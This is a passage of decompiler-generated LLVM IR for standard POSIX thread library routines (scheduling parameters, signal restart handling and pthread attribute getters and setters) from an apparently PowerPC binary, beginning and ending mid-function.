  %v4_10005eb8 = icmp eq i32 %v0_10005ec8, ptrtoint (i32* @global_var_1002a940.248 to i32)
  br i1 %v4_10005eb8, label %dec_label_pc_10005ec0, label %dec_label_pc_10005ec8

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005eb0
  store i32 ptrtoint (i32* @global_var_10005ec4.259 to i32), i32* @lr, align 4
  %v1_10005ec0 = call i32 @__pthread_manager_sighandler(i32 ptrtoint (i32* @global_var_1002a940.248 to i32))
  store i32 %v1_10005ec0, i32* @r3, align 4
  br label %dec_label_pc_10005f58

dec_label_pc_10005ec8:                            ; preds = %dec_label_pc_10005eb0
  store i32 %v0_10005ec8, i32* @r2, align 4
  store i32 %v0_10005ec8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005ed0

dec_label_pc_10005ed0:                            ; preds = %entry, %dec_label_pc_10005ec8
  %v0_10005ee8 = phi i32 [ %v0_10005e54, %entry ], [ %v0_10005ec8, %dec_label_pc_10005ec8 ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005ed4 = load i32, i32* @global_var_1002f008.260, align 4
  %v3_10005ed8 = icmp eq i32 %v3_10005ed4, 0
  br i1 %v3_10005ed8, label %dec_label_pc_10005f10, label %dec_label_pc_10005ee0

dec_label_pc_10005ee0:                            ; preds = %dec_label_pc_10005ed0
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005ee4 = load i32, i32* @global_var_1002ef30, align 4
  %v4_10005ee8 = icmp eq i32 %v0_10005ee8, %v3_10005ee4
  br i1 %v4_10005ee8, label %dec_label_pc_10005ef0, label %dec_label_pc_10005f04

dec_label_pc_10005ef0:                            ; preds = %dec_label_pc_10005ee0
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005ef8 = load i32, i32* @global_var_1002a954.221, align 4
  store i32 268459780, i32* @lr, align 4
  %v3_10005f00 = call i32 @waitpid(i32 %v3_10005ef8, i32 0, i32 -2147483648)
  br label %dec_label_pc_10005f04

dec_label_pc_10005f04:                            ; preds = %dec_label_pc_10005ee0, %dec_label_pc_10005ef0
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10005f08 = load i32, i32* @global_var_1002f00c.261, align 4
  %v1_10005f0c = call i32 @__GI__exit(i32 %v3_10005f08)
  store i32 %v1_10005f0c, i32* @r3, align 4
  %v0_10005f10.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10005f10

dec_label_pc_10005f10:                            ; preds = %dec_label_pc_10005ed0, %dec_label_pc_10005f04
  %v0_10005f28 = phi i32 [ %v0_10005ee8, %dec_label_pc_10005ed0 ], [ %v0_10005f10.pre, %dec_label_pc_10005f04 ]
  %v1_10005f10 = add i32 %v0_10005f28, 66
  %v2_10005f10 = inttoptr i32 %v1_10005f10 to i8*
  %v3_10005f10 = load i8, i8* %v2_10005f10, align 1
  %v3_10005f14 = icmp eq i8 %v3_10005f10, 0
  br i1 %v3_10005f14, label %dec_label_pc_10005f58, label %dec_label_pc_10005f1c

dec_label_pc_10005f1c:                            ; preds = %dec_label_pc_10005f10
  %v1_10005f1c = add i32 %v0_10005f28, 64
  %v2_10005f1c = inttoptr i32 %v1_10005f1c to i8*
  %v3_10005f1c = load i8, i8* %v2_10005f1c, align 1
  %v4_10005f1c = zext i8 %v3_10005f1c to i32
  store i32 %v4_10005f1c, i32* %r9.global-to-local, align 4
  %v3_10005f20 = icmp eq i8 %v3_10005f1c, 0
  br i1 %v3_10005f20, label %dec_label_pc_10005f28, label %dec_label_pc_10005f58

dec_label_pc_10005f28:                            ; preds = %dec_label_pc_10005f1c
  %v1_10005f28 = add i32 %v0_10005f28, 65
  %v2_10005f28 = inttoptr i32 %v1_10005f28 to i8*
  %v3_10005f28 = load i8, i8* %v2_10005f28, align 1
  %v3_10005f2c = icmp eq i8 %v3_10005f28, 1
  br i1 %v3_10005f2c, label %dec_label_pc_10005f34, label %dec_label_pc_10005f40

dec_label_pc_10005f34:                            ; preds = %dec_label_pc_10005f28
  %v0_10005f3c = call i32 @__pthread_do_exit()
  %v0_10005f40.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005f40

dec_label_pc_10005f40:                            ; preds = %dec_label_pc_10005f28, %dec_label_pc_10005f34
  %v1_10005f4c = phi i32 [ %v0_10005f28, %dec_label_pc_10005f28 ], [ %v0_10005f40.pre, %dec_label_pc_10005f34 ]
  %v1_10005f40 = add i32 %v1_10005f4c, 40
  %v2_10005f40 = inttoptr i32 %v1_10005f40 to i32*
  %v3_10005f40 = load i32, i32* %v2_10005f40, align 4
  store i32 %v3_10005f40, i32* @r3, align 4
  %v3_10005f44 = icmp eq i32 %v3_10005f40, 0
  br i1 %v3_10005f44, label %dec_label_pc_10005f58, label %dec_label_pc_10005f4c

dec_label_pc_10005f4c:                            ; preds = %dec_label_pc_10005f40
  %v0_10005f4c = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_10005f4c, i32* %v2_10005f40, align 4
  store i32 268459864, i32* @lr, align 4
  %v0_10005f54 = load i32, i32* @r3, align 4
  %v2_10005f54 = call i32 @siglongjmp(i32 %v0_10005f54, i32 1)
  store i32 %v2_10005f54, i32* @r3, align 4
  br label %dec_label_pc_10005f58

dec_label_pc_10005f58:                            ; preds = %dec_label_pc_10005f1c, %dec_label_pc_10005f40, %dec_label_pc_10005f10, %dec_label_pc_10005ec0, %dec_label_pc_10005f4c
  %v0_10005f64 = load i32, i32* @r3, align 4
  ret i32 %v0_10005f64

; uselistorder directives
  uselistorder i32 %v0_10005ec8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10005e94, { 1, 2, 3, 0 }
  uselistorder i32 %v5_10005e50, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9 }
  uselistorder i32* %r11.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10005f58, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10005f40, { 1, 0 }
  uselistorder label %dec_label_pc_10005f10, { 1, 0 }
  uselistorder label %dec_label_pc_10005f04, { 1, 0 }
  uselistorder label %dec_label_pc_10005ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10005e98, { 2, 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10005f74 = load i32, i32* @r2, align 4
  %v2_10005f74 = add i32 %v1_10005f74, 32
  %v3_10005f74 = inttoptr i32 %v2_10005f74 to i32*
  store i32 %arg1, i32* %v3_10005f74, align 4
  %v0_10005f78 = load i32, i32* @r2, align 4
  %v1_10005f78 = add i32 %v0_10005f78, 36
  %v2_10005f78 = inttoptr i32 %v1_10005f78 to i32*
  %v3_10005f78 = load i32, i32* %v2_10005f78, align 4
  %v3_10005f7c = icmp eq i32 %v3_10005f78, 0
  br i1 %v3_10005f7c, label %entry.dec_label_pc_10005f90_crit_edge, label %dec_label_pc_10005f84

entry.dec_label_pc_10005f90_crit_edge:            ; preds = %entry
  %v0_10005f9c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005f90

dec_label_pc_10005f84:                            ; preds = %entry
  store i32 %v3_10005f78, i32* %r3.global-to-local, align 4
  store i32 268459920, i32* @lr, align 4
  %v2_10005f8c = call i32 @siglongjmp(i32 %v3_10005f78, i32 1)
  store i32 %v2_10005f8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005f90

dec_label_pc_10005f90:                            ; preds = %entry.dec_label_pc_10005f90_crit_edge, %dec_label_pc_10005f84
  %v0_10005f9c = phi i32 [ %v0_10005f9c.pre, %entry.dec_label_pc_10005f90_crit_edge ], [ %v2_10005f8c, %dec_label_pc_10005f84 ]
  ret i32 %v0_10005f9c

; uselistorder directives
  uselistorder i32 %v3_10005f78, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder label %dec_label_pc_10005f90, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10005fb8 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10005fbc = add i32 %v1_10005fb8, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 %v2_10005fbc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268459992, i32* @lr, align 4
  %v0_10005fd4 = call i32 @__pthread_lock()
  store i32 %v0_10005fd4, i32* %r3.global-to-local, align 4
  %v0_10005fd8 = load i32, i32* @r31, align 4
  %v1_10005fd8 = add i32 %v0_10005fd8, 8
  %v2_10005fd8 = inttoptr i32 %v1_10005fd8 to i32*
  %v3_10005fd8 = load i32, i32* %v2_10005fd8, align 4
  store i32 %v0_10005fd8, i32* @r3, align 4
  %v3_10005fe0 = icmp eq i32 %v3_10005fd8, 0
  br i1 %v3_10005fe0, label %dec_label_pc_10005ff4, label %dec_label_pc_10005fe8

dec_label_pc_10005fe8:                            ; preds = %entry
  %v1_10005fe8 = add i32 %v3_10005fd8, 16
  %v2_10005fe8 = inttoptr i32 %v1_10005fe8 to i32*
  %v3_10005fe8 = load i32, i32* %v2_10005fe8, align 4
  %v0_10005fec = load i32, i32* @r29, align 4
  %v4_10005fec = icmp eq i32 %v0_10005fec, %v3_10005fe8
  br i1 %v4_10005fec, label %dec_label_pc_10006000, label %dec_label_pc_10005ff4

dec_label_pc_10005ff4:                            ; preds = %dec_label_pc_10005fe8, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10005ff8.263 to i32), i32* @lr, align 4
  %v0_10005ff4 = call i32 @__pthread_unlock()
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006048

dec_label_pc_10006000:                            ; preds = %dec_label_pc_10005fe8
  %v1_10006000 = add i32 %v3_10005fd8, 20
  %v2_10006000 = inttoptr i32 %v1_10006000 to i32*
  %v3_10006000 = load i32, i32* %v2_10006000, align 4
  store i32 %v3_10006000, i32* %r29.global-to-local, align 4
  store i32 %v0_10005fd8, i32* @r3, align 4
  store i32 268460044, i32* @lr, align 4
  %v0_10006008 = call i32 @__pthread_unlock()
  store i32 %v3_10006000, i32* %r3.global-to-local, align 4
  store i32 268460052, i32* @lr, align 4
  %v1_10006010 = call i32 @sched_getscheduler(i32 %v3_10006000)
  %v0_10006014 = load i32, i32* @r30, align 4
  store i32 %v1_10006010, i32* @r31, align 4
  %v0_1000601c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000601c, i32* %r3.global-to-local, align 4
  %v3_10006020 = icmp eq i32 %v1_10006010, -1
  br i1 %v3_10006020, label %dec_label_pc_10006038, label %dec_label_pc_10006028

dec_label_pc_10006028:                            ; preds = %dec_label_pc_10006000
  store i32 268460076, i32* @lr, align 4
  %v2_10006028 = call i32 @sched_getparam(i32 %v0_1000601c, i32 %v0_10006014)
  %v3_1000602c = icmp eq i32 %v2_10006028, -1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1000602c, label %dec_label_pc_10006038, label %dec_label_pc_10006044

dec_label_pc_10006038:                            ; preds = %dec_label_pc_10006028, %dec_label_pc_10006000
  %v0_10006038 = call i32 @__errno_location()
  store i32 %v0_10006038, i32* %r3.global-to-local, align 4
  %v1_1000603c = inttoptr i32 %v0_10006038 to i32*
  %v2_1000603c = load i32, i32* %v1_1000603c, align 4
  store i32 %v2_1000603c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006048

dec_label_pc_10006044:                            ; preds = %dec_label_pc_10006028
  %v0_10006044 = load i32, i32* @r31, align 4
  %v1_10006044 = load i32, i32* %r28.global-to-local, align 4
  %v2_10006044 = inttoptr i32 %v1_10006044 to i32*
  store i32 %v0_10006044, i32* %v2_10006044, align 4
  %v0_10006058.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006048

dec_label_pc_10006048:                            ; preds = %dec_label_pc_10006038, %dec_label_pc_10005ff4, %dec_label_pc_10006044
  %v0_10006058 = phi i32 [ %v2_1000603c, %dec_label_pc_10006038 ], [ 3, %dec_label_pc_10005ff4 ], [ %v0_10006058.pre, %dec_label_pc_10006044 ]
  ret i32 %v0_10006058

; uselistorder directives
  uselistorder i32 %v3_10006000, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006048, { 2, 0, 1 }
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %v1_10006074 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10006078 = add i32 %v1_10006074, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %v2_10006078, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 268460180, i32* @lr, align 4
  %v0_10006090 = call i32 @__pthread_lock()
  %v0_10006094 = load i32, i32* @r31, align 4
  %v1_10006094 = add i32 %v0_10006094, 8
  %v2_10006094 = inttoptr i32 %v1_10006094 to i32*
  %v3_10006094 = load i32, i32* %v2_10006094, align 4
  store i32 %v3_10006094, i32* %r30.global-to-local, align 4
  store i32 %v0_10006094, i32* @r3, align 4
  %v3_1000609c = icmp eq i32 %v3_10006094, 0
  br i1 %v3_1000609c, label %dec_label_pc_100060b8, label %dec_label_pc_100060a4

dec_label_pc_100060a4:                            ; preds = %entry
  %v1_100060a4 = add i32 %v3_10006094, 16
  %v2_100060a4 = inttoptr i32 %v1_100060a4 to i32*
  %v3_100060a4 = load i32, i32* %v2_100060a4, align 4
  %v0_100060b0 = load i32, i32* @r29, align 4
  %v4_100060b0 = icmp eq i32 %v0_100060b0, %v3_100060a4
  br i1 %v4_100060b0, label %dec_label_pc_100060c4, label %dec_label_pc_100060b8

dec_label_pc_100060b8:                            ; preds = %dec_label_pc_100060a4, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_100060bc.264 to i32), i32* @lr, align 4
  %v0_100060b8 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10006120

dec_label_pc_100060c4:                            ; preds = %dec_label_pc_100060a4
  store i32 268460236, i32* @lr, align 4
  %v0_100060c8 = call i32 @sched_setscheduler()
  %v0_100060cc = load i32, i32* %r28.global-to-local, align 4
  %v3_100060d0 = icmp eq i32 %v0_100060c8, -1
  %v0_100060d8 = load i32, i32* @r31, align 4
  store i32 %v0_100060d8, i32* @r3, align 4
  br i1 %v3_100060d0, label %dec_label_pc_100060e0, label %dec_label_pc_100060f0

dec_label_pc_100060e0:                            ; preds = %dec_label_pc_100060c4
  store i32 268460260, i32* @lr, align 4
  %v0_100060e0 = call i32 @__pthread_unlock()
  %v0_100060e4 = call i32 @__errno_location()
  %v1_100060e8 = inttoptr i32 %v0_100060e4 to i32*
  %v2_100060e8 = load i32, i32* %v1_100060e8, align 4
  br label %dec_label_pc_10006120

dec_label_pc_100060f0:                            ; preds = %dec_label_pc_100060c4
  %v3_100060cc = icmp eq i32 %v0_100060cc, 0
  br i1 %v3_100060cc, label %dec_label_pc_100060f8, label %dec_label_pc_100060f4

dec_label_pc_100060f4:                            ; preds = %dec_label_pc_100060f0
  %v0_100060f4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100060f4 = inttoptr i32 %v0_100060f4 to i32*
  %v2_100060f4 = load i32, i32* %v1_100060f4, align 4
  br label %dec_label_pc_100060f8

dec_label_pc_100060f8:                            ; preds = %dec_label_pc_100060f0, %dec_label_pc_100060f4
  %v0_100060f8 = phi i32 [ 0, %dec_label_pc_100060f0 ], [ %v2_100060f4, %dec_label_pc_100060f4 ]
  %v1_100060f8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100060f8 = add i32 %v1_100060f8, 24
  %v3_100060f8 = inttoptr i32 %v2_100060f8 to i32*
  store i32 %v0_100060f8, i32* %v3_100060f8, align 4
  store i32 268460288, i32* @lr, align 4
  %v0_100060fc = call i32 @__pthread_unlock()
  %v3_10006104 = load i32, i32* @global_var_1002ef34.220, align 4
  %v1_1000610c = icmp slt i32 %v3_10006104, 0
  br i1 %v1_1000610c, label %dec_label_pc_10006120, label %dec_label_pc_10006114

dec_label_pc_10006114:                            ; preds = %dec_label_pc_100060f8
  %v0_10006114 = load i32, i32* %r30.global-to-local, align 4
  %v1_10006114 = add i32 %v0_10006114, 24
  %v2_10006114 = inttoptr i32 %v1_10006114 to i32*
  %v3_10006114 = load i32, i32* %v2_10006114, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000611c.265 to i32), i32* @lr, align 4
  %v1_10006118 = call i32 @__pthread_manager_adjust_prio(i32 %v3_10006114)
  br label %dec_label_pc_10006120

dec_label_pc_10006120:                            ; preds = %dec_label_pc_100060f8, %dec_label_pc_100060e0, %dec_label_pc_100060b8, %dec_label_pc_10006114
  %v0_10006130 = phi i32 [ 0, %dec_label_pc_100060f8 ], [ %v2_100060e8, %dec_label_pc_100060e0 ], [ 3, %dec_label_pc_100060b8 ], [ 0, %dec_label_pc_10006114 ]
  ret i32 %v0_10006130

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10006120, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100060f8, { 1, 0 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000613c = icmp ugt i32 %arg2, 1
  br i1 %v2_1000613c, label %dec_label_pc_10006150, label %dec_label_pc_10006148

dec_label_pc_10006148:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10006150

dec_label_pc_10006150:                            ; preds = %entry, %dec_label_pc_10006148
  %v0_10006150 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10006148 ]
  ret i32 %v0_10006150

; uselistorder directives
  uselistorder label %dec_label_pc_10006150, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10006158 = load i32, i32* %arg1, align 4
  %v2_10006160 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10006158, i32* %v2_10006160, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10006168 = icmp ugt i32 %arg2, 2
  br i1 %v2_10006168, label %dec_label_pc_1000617c, label %dec_label_pc_10006174

dec_label_pc_10006174:                            ; preds = %entry
  %v2_10006174 = add i32 %arg1, 4
  %v3_10006174 = inttoptr i32 %v2_10006174 to i32*
  store i32 %arg2, i32* %v3_10006174, align 4
  br label %dec_label_pc_1000617c

dec_label_pc_1000617c:                            ; preds = %entry, %dec_label_pc_10006174
  %v0_1000617c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10006174 ]
  ret i32 %v0_1000617c

; uselistorder directives
  uselistorder label %dec_label_pc_1000617c, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10006184 = add i32 %arg1, 4
  %v2_10006184 = inttoptr i32 %v1_10006184 to i32*
  %v3_10006184 = load i32, i32* %v2_10006184, align 4
  store i32 %v3_10006184, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10006194 = icmp ugt i32 %arg2, 1
  br i1 %v2_10006194, label %dec_label_pc_100061a8, label %dec_label_pc_100061a0

dec_label_pc_100061a0:                            ; preds = %entry
  %v2_100061a0 = add i32 %arg1, 12
  %v3_100061a0 = inttoptr i32 %v2_100061a0 to i32*
  store i32 %arg2, i32* %v3_100061a0, align 4
  br label %dec_label_pc_100061a8

dec_label_pc_100061a8:                            ; preds = %entry, %dec_label_pc_100061a0
  %v0_100061a8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100061a0 ]
  ret i32 %v0_100061a8

; uselistorder directives
  uselistorder label %dec_label_pc_100061a8, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100061b0 = add i32 %arg1, 12
  %v2_100061b0 = inttoptr i32 %v1_100061b0 to i32*
  %v3_100061b0 = load i32, i32* %v2_100061b0, align 4
  store i32 %v3_100061b0, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_100061c0 = icmp eq i32 %arg2, 0
  %v1_100061c4 = xor i32 %arg2, 1
  %tmp = icmp slt i32 %arg2, 0
  %v1_100061c8 = zext i1 %tmp to i32
  %v2_100061c8 = ashr i32 %arg2, 31
  %v3_100061c8 = and i32 %v2_100061c8, -2
  %v4_100061c8 = or i32 %v3_100061c8, %v1_100061c8
  %v2_100061cc = xor i32 %v1_100061c4, %v4_100061c8
  %v2_100061d0 = sub i32 %v4_100061c8, %v2_100061cc
  %tmp2 = icmp slt i32 %v2_100061d0, 0
  %v1_100061d4 = zext i1 %tmp2 to i32
  %v2_100061d4 = ashr i32 %v2_100061d0, 31
  %v3_100061d4 = and i32 %v2_100061d4, -74
  %v2_100061dc = or i32 %v3_100061d4, %v1_100061d4
  %v1_100061e0 = add nsw i32 %v2_100061dc, 95
  br i1 %v3_100061c0, label %dec_label_pc_100061e8, label %dec_label_pc_100061f0

dec_label_pc_100061e8:                            ; preds = %entry
  %v2_100061e8 = add i32 %arg1, 16
  %v3_100061e8 = inttoptr i32 %v2_100061e8 to i32*
  store i32 0, i32* %v3_100061e8, align 4
  br label %dec_label_pc_100061f0

dec_label_pc_100061f0:                            ; preds = %entry, %dec_label_pc_100061e8
  %v0_100061f0 = phi i32 [ %v1_100061e0, %entry ], [ 0, %dec_label_pc_100061e8 ]
  ret i32 %v0_100061f0

; uselistorder directives
  uselistorder i32 %v2_100061d0, { 1, 0 }
  uselistorder i32 %v4_100061c8, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100061f0, { 1, 0 }
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100061f8 = add i32 %arg1, 16
  %v2_100061f8 = inttoptr i32 %v1_100061f8 to i32*
  %v3_100061f8 = load i32, i32* %v2_100061f8, align 4
  store i32 %v3_100061f8, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10006208 = add i32 %arg1, 20
  %v2_10006208 = inttoptr i32 %v1_10006208 to i32*
  %v3_10006208 = load i32, i32* %v2_10006208, align 4
  store i32 %v3_10006208, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1000621c = add i32 %arg1, 28
  %v3_1000621c = inttoptr i32 %v2_1000621c to i32*
  store i32 %arg2, i32* %v3_1000621c, align 4
  %v0_10006220 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006220 = add i32 %arg1, 24
  %v3_10006220 = inttoptr i32 %v2_10006220 to i32*
  store i32 %v0_10006220, i32* %v3_10006220, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_1000622c = add i32 %arg1, 28
  %v2_1000622c = inttoptr i32 %v1_1000622c to i32*
  %v3_1000622c = load i32, i32* %v2_1000622c, align 4
  store i32 %v3_1000622c, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg2, 16384
  br i1 %tmp, label %dec_label_pc_10006250, label %dec_label_pc_10006248

dec_label_pc_10006248:                            ; preds = %entry
  %v2_10006248 = add i32 %arg1, 32
  %v3_10006248 = inttoptr i32 %v2_10006248 to i32*
  store i32 %arg2, i32* %v3_10006248, align 4
  br label %dec_label_pc_10006250

dec_label_pc_10006250:                            ; preds = %entry, %dec_label_pc_10006248
  %v0_10006250 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10006248 ]
  ret i32 %v0_10006250

; uselistorder directives
  uselistorder label %dec_label_pc_10006250, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10006258 = add i32 %arg1, 32
  %v2_10006258 = inttoptr i32 %v1_10006258 to i32*
  %v3_10006258 = load i32, i32* %v2_10006258, align 4
  store i32 %v3_10006258, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10006268 = load i32, i32* @lr, align 4
  store i32 %v0_10006268, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10006280.266 to i32), i32* @lr, align 4
  %v0_1000627c = call i32 @__GI_getpagesize()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10006288 = sub i32 2097152, %v0_1000627c
  store i32 %v2_10006288, i32* %r0.global-to-local, align 4
  %v2_1000628c = add i32 %tmp, 20
  %v3_1000628c = inttoptr i32 %v2_1000628c to i32*
  store i32 %v0_1000627c, i32* %v3_1000628c, align 4
  %v0_10006290 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006290 = load i32, i32* %r29.global-to-local, align 4
  %v2_10006290 = add i32 %v1_10006290, 32
  %v3_10006290 = inttoptr i32 %v2_10006290 to i32*
  store i32 %v0_10006290, i32* %v3_10006290, align 4
  %v1_10006298 = load i32, i32* %r29.global-to-local, align 4
  %v2_10006298 = add i32 %v1_10006298, 12
  %v3_10006298 = inttoptr i32 %v2_10006298 to i32*
  store i32 1, i32* %v3_10006298, align 4
  %v0_100062a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100062a0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100062a0 = add i32 %v1_100062a0, 24
  %v3_100062a0 = inttoptr i32 %v2_100062a0 to i32*
  store i32 %v0_100062a0, i32* %v3_100062a0, align 4
  %v0_100062a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100062a4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100062a4 = inttoptr i32 %v1_100062a4 to i32*
  store i32 %v0_100062a4, i32* %v2_100062a4, align 4
  %v0_100062a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100062a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100062a8 = add i32 %v1_100062a8, 4
  %v3_100062a8 = inttoptr i32 %v2_100062a8 to i32*
  store i32 %v0_100062a8, i32* %v3_100062a8, align 4
  %v0_100062ac = load i32, i32* %r9.global-to-local, align 4
  %v1_100062ac = load i32, i32* %r29.global-to-local, align 4
  %v2_100062ac = add i32 %v1_100062ac, 8
  %v3_100062ac = inttoptr i32 %v2_100062ac to i32*
  store i32 %v0_100062ac, i32* %v3_100062ac, align 4
  %v0_100062b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100062b0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100062b0 = add i32 %v1_100062b0, 16
  %v3_100062b0 = inttoptr i32 %v2_100062b0 to i32*
  store i32 %v0_100062b0, i32* %v3_100062b0, align 4
  %v0_100062b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100062b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100062b4 = add i32 %v1_100062b4, 28
  %v3_100062b4 = inttoptr i32 %v2_100062b4 to i32*
  store i32 %v0_100062b4, i32* %v3_100062b4, align 4
  store i32 %v0_10006268, i32* %r0.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268460776, i32* @lr, align 4
  %v0_100062e4 = call i32 @__GI_getpagesize()
  %v1_100062e8 = add i32 %arg1, 32
  %v2_100062e8 = inttoptr i32 %v1_100062e8 to i32*
  %v3_100062e8 = load i32, i32* %v2_100062e8, align 4
  %v2_100062ec = add i32 %v0_100062e4, -1
  %v1_100062f4 = add i32 %v2_100062ec, %arg2
  %v2_100062f8 = urem i32 %v1_100062f4, %v0_100062e4
